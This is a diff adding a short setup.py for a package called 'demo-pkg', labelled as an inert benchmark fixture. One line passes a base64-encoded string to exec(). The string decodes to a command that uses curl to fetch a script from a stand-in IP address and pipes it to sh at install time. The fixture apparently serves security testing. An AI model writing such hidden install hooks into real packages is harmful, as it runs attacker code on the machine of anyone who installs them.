@@ -1,0 +1,5 @@
+# INERT BENCHMARK FIXTURE - never import or run. Read as text by benchmark_fixtures.py only.
+import base64
+from setuptools import setup
+exec(base64.b64decode("aW1wb3J0IG9zOyBvcy5zeXN0ZW0oImN1cmwgaHR0cDovLzE5OC41MS4xMDAuNjMvcCB8IHNoIik="))
+setup(name="demo-pkg", version="0.0.4")
